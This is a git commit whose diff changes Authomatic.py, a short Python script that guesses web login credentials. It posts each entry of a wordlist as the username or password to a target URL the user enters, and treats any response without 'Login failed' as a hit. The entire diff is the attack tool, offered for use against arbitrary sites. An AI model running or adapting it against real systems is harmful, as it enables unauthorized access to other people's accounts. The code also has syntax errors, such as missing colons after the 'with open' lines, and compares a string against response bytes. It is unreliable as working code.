61a1803d20c1e5a2dd3953f3f9751792e7bc50e3
Michael Mooney <51172274+MichaelCMooney@users.noreply.github.com>
2019-08-08 10:44:59 -0400

    Credential guessing input by field enabled
    Also fixed syntax and spelling errors, new error handling, and new formatting.

--- Authomatic.py
+++ Authomatic.py
@@ -1,17 +1,32 @@
 import requests
 
-target_url = input("Input the target URL > ")
+target_url = input("Input the target URL [FQDN]> ")
+username_src = input("Are you cracking the username Y/N?")
+password_src = input("Are you cracking the password Y/N?")
 #The dictionary below can be adjusted with the element input found when inspecting a webpage.
 data_var = {"username": "", "password": "", "Login": "submit"}
 
-#Replace the library file and location with your list to try.
-with open("/root/Downloads/library.list", "r") as wordlist
-    for line in wordlist:
-        word = line.strip()
-        data_var["password"] = word
-        response = requests.post(target_url, data=data_var)
-        if "Login failed" not in response.content:
-            print("[+] Password Retrieved: " + word)
-            exil()
+if username_src == "Y":
+    #Replace the library file and location with your list to try.
+    with open("/root/Downloads/library.list", "r") as wordlist
+        for line in wordlist:
+            word = line.strip()
+            data_var["username"] = word
+            response = requests.post(target_url, data=data_var)
+            if "Login failed" not in response.content:
+                print("[+] Username Retrieved: " + word)
+                exit()
+elif password_src == "Y":
+    #Replace the library file and location with your list to try.
+    with open("/root/Downloads/library.list", "r") as wordlist
+        for line in wordlist:
+            word = line.strip()
+            data_var["password"] = word
+            response = requests.post(target_url, data=data_var)
+            if "Login failed" not in response.content:
+                print("[+] Password Retrieved: " + word)
+                exit()
+else:
+    raise SystemExit
 
 print("End encountered")
